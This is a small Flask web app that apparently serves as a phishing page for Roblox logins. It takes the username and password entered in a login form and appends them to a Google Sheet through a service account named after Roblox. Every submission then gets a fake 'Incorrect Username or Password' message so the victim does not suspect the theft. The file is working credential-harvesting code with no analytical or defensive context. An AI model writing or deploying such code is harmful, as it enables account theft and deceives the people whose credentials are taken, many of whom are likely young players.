from flask import Flask, render_template, request
from pathlib import Path
import gspread


app = Flask(__name__)

DATA_FILE = Path(__file__).parent / 'submitted_data.csv'

@app.route('/', methods=['GET', 'POST'])
def index():

    message = ""

    if request.method == 'POST':
        
        username = request.form.get("username")
        password = request.form.get("password")

        gc = gspread.service_account(filename='roblox@roblox-508411.iam.gserviceaccount.com.json')
        spreadsheet = gc.open("My Data Sheet")
        sheet = spreadsheet.sheet1
        sheet.append_row([username, password])
        
        message = "Incorrect Username or Password"

    return render_template('index.html', message=message)


if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0')
